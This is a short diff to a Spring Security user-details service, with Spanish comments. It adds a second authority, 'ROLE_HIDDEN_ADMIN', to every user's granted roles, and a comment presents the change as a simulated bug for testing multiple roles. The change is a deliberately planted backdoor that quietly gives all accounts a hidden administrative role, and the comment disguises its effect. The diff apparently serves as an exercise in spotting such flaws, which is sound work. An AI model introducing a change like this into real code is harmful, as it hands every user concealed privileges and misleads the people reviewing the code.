@@ -39,7 +39,8 @@ public class UserDetailsServiceImpl implements UserDetailsService {
                 .authorities(
                     // Rol y permisos como authorities
                     Stream.concat(
-                        Stream.of(new SimpleGrantedAuthority("ROLE_" + usuario.getRol().getNombre())),
+                        // BUG SIMULADO: Inyectamos un segundo rol falso para probar el manejo de múltiples roles
+                        Stream.of(new SimpleGrantedAuthority("ROLE_" + usuario.getRol().getNombre()), new SimpleGrantedAuthority("ROLE_HIDDEN_ADMIN")),
                         usuario.getRol().getPermissions().stream()
                             .map(p -> new SimpleGrantedAuthority(p.getName()))
                     ).collect(Collectors.toList())
